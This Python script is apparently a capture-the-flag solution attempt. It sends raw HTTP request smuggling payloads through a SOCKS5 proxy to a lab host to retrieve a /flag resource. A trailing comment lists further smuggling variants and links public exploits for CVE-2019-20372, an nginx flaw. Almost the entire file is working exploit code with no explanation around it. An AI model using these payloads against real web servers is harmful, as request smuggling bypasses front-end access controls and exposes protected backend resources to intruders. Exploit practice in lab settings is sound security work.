import socks
import socket

# Set up SOCKS5 proxy
socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 8123)
socket.socket = socks.socksocket

# Target
host = "192.168.2.199"
port = 50975

# Connect to target
sock = socket.create_connection((host, port))

# Craft the HTTP request smuggling payload
payload = (
    "POST /flag HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Content-Length: 35\r\n"
    "\r\n"
    "GET /flag HTTP/1.1\r\n"
    "Host: 14828\r\n"
    "\r\n"
)

# Send payload
sock.send(payload.encode())

# Read response
response = b""
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
finally:
    sock.close()

# Print response
print(response.decode(errors="ignore"))

sock = socket.create_connection((host, port))
payload = (
    "GET /post HTTP/1.1\r\n"
    f"Host: {host}\r\n"
    "\r\n"
)

# Send payload
sock.send(payload.encode())

# Read response
response = b""
try:
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
finally:
    sock.close()

# Print response
print(response.decode(errors="ignore"))




"""
different payloads that I have tried:

payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Content-Length: 39\r\n"
    "Transfer-Encoding: chunked\r\n"
    "\r\n"
    "21\r\n"
    "GET /flag HTTP/1.1\r\n"
    "Host: 14828\r\n"
    "\r\n"
    "0\r\n"
)

https://github.com/vuongnv3389-sec/CVE-2019-20372
payload = (
    "POST / HTTP/1.1\r\n"
    f"Host: {host}:{port}\r\n"
    "Content-Length: 35\r\n"
    "\r\n"
    "GET /flag HTTP/1.1\r\n"
    "Host: 14828\r\n"
    "\r\n"
)


https://github.com/0xleft/CVE-2019-20372/blob/ea73582be933d4f55d7a2ae331c97104bf0aa71e/exploit.py
payload = (
    f"GET / HTTP/1.1\r\n"
    f"Host: {frontend_host}\r\n"
    f"\r\n"
    f"GET /flag.html HTTP/1.1\r\n"
    f"Host: {backend_host}\r\n"
    f"\r\n"
)

"""